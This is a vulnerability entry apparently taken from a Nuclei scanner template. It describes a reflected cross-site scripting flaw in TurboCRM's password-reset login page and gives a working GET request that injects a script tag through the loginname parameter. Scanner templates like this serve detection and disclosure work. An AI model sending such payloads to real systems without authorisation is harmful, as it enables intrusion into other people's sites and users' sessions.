# Nuclei Template: TurboCRM - Cross-Site Scripting
**Template ID:** turbocrm-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`turbocrm-xss.yaml`)

## Vulnerability Information & PoC

## Description
TurboCRM contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript into the response returned by the application.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://gist.github.com/pikpikcu/9689c5220abbe04d4927ffa660241b4a
